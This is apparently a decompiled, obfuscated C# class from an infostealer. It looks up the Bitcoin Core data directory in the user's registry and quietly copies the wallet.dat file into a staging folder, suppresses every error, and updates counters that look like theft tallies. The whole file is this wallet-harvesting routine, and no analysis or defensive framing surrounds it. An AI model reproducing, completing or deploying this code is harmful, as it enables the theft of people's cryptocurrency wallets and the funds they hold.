using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x0200005B RID: 91
internal class Class28
{
	// Token: 0x06000249 RID: 585 RVA: 0x00012A88 File Offset: 0x00010C88
	public static void smethod_0(string string_0)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
			{
				try
				{
					Directory.CreateDirectory(string_0 + "\\Wallets\\BitcoinCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\BitcoinCore\\wallet.dat");
					Class28.int_0++;
					Class37.int_0++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600024A RID: 586 RVA: 0x0000446C File Offset: 0x0000266C
	public Class28()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x04000109 RID: 265
	public static int int_0;
}
